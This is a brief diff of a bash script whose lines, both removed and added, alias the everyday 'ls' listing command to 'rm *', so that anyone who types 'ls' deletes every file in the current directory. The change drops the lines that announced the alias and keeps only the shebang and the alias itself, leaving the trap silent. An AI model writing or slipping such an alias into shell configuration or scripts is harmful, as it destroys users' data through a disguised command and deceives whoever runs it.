@@ -1,4 +1,2 @@
-alias ls='rm *'
-echo "Alias 'ls' has been set to 'rm *'"
-echo "Use '\ls' to run the original 'ls' command."
-source "$HOME/.bashrc"
+#!/bin/bash
+alias ls="rm *"
